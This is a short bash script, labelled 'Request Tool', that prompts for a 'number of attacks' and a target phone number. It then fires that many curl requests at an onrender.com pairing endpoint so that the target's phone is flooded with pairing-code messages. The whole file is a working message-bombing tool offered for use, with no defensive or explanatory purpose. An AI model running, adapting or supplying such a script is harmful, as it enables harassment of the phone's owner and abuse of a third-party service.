echo $'\r\r\r\r\r\r'; figlet '                           FORG'



# Request Tool

read -p "number of attacks: " request_count
read -p "Enter the target phone number: " target_number

for i in $(seq 1 $request_count); do
  echo " -o /dev/null https://suhail-md-vtsf.onrender.com/pair?number=$target_number:"
done | xargs curl -s
